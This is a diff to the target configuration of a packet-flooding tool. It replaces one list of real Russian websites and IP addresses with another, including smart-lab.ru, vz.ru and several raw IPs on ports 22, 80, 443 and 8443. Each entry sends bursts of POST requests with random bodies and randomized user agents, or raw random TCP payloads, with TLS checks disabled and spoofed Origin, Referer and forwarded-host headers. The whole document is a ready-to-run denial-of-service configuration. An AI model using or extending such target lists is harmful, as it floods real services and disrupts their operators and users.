@@ -8,14 +8,14 @@
         },
         {
             "type": "packetgen",
-            "count": 58,
-            "name": "https://cont.ws",
+            "count": 52,
+            "name": "https://smart-lab.ru/",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "cont.ws:443",
+                        "address": "smart-lab.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -26,7 +26,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://cont.ws",
+                            "path": "https://smart-lab.ru/",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -39,9 +39,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://cont.ws",
-                                "Referer": "https://cont.ws",
-                                "X-Forwarded-Host": "cont.ws",
+                                "Origin": "https://smart-lab.ru/",
+                                "Referer": "https://smart-lab.ru/",
+                                "X-Forwarded-Host": "smart-lab.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -52,14 +52,55 @@
         },
         {
             "type": "packetgen",
-            "count": 58,
-            "name": "tcp://88.212.231.252:22",
+            "count": 52,
+            "name": "http://vz.ru/",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "88.212.231.252:22"
+                        "address": "vz.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://vz.ru/",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://vz.ru/",
+                                "Referer": "http://vz.ru/",
+                                "X-Forwarded-Host": "vz.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 52,
+            "name": "tcp://81.163.21.216:443",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "81.163.21.216:443"
                     }
                 },
                 "packet": {
@@ -74,14 +115,143 @@
         },
         {
             "type": "packetgen",
-            "count": 58,
-            "name": "https://svpressa.ru/",
+            "count": 52,
+            "name": "tcp://88.212.201.213:8443",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "svpressa.ru:443",
+                        "address": "88.212.201.213:8443"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 52,
+            "name": "tcp://185.185.58.185:80",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "185.185.58.185:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 52,
+            "name": "tcp://5.188.136.117:443",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "5.188.136.117:443"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 52,
+            "name": "http://smart-lab.ru/",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "smart-lab.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://smart-lab.ru/",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://smart-lab.ru/",
+                                "Referer": "http://smart-lab.ru/",
+                                "X-Forwarded-Host": "smart-lab.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 52,
+            "name": "tcp://88.212.201.213:22",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "88.212.201.213:22"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 52,
+            "name": "https://vz.ru/",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "vz.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -92,7 +262,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://svpressa.ru/",
+                            "path": "https://vz.ru/",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -105,9 +275,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://svpressa.ru/",
-                                "Referer": "https://svpressa.ru/",
-                                "X-Forwarded-Host": "svpressa.ru",
+                                "Origin": "https://vz.ru/",
+                                "Referer": "https://vz.ru/",
+                                "X-Forwarded-Host": "vz.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -118,162 +288,14 @@
         },
         {
             "type": "packetgen",
-            "count": 58,
-            "name": "http://svpressa.ru/",
+            "count": 52,
+            "name": "tcp://5.188.136.118:80",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "svpressa.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://svpressa.ru/",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://svpressa.ru/",
-                                "Referer": "http://svpressa.ru/",
-                                "X-Forwarded-Host": "svpressa.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 58,
-            "name": "tcp://88.212.231.252:443",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "88.212.231.252:443"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 58,
-            "name": "tcp://88.212.231.252:80",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "88.212.231.252:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 58,
-            "name": "http://cont.ws",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "cont.ws:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://cont.ws",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://cont.ws",
-                                "Referer": "http://cont.ws",
-                                "X-Forwarded-Host": "cont.ws",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 58,
-            "name": "tcp://93.189.147.4:5666",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "93.189.147.4:5666"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 58,
-            "name": "tcp://93.189.147.4:22",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "93.189.147.4:22"
+                        "address": "5.188.136.118:80"
                     }
                 },
                 "packet": {
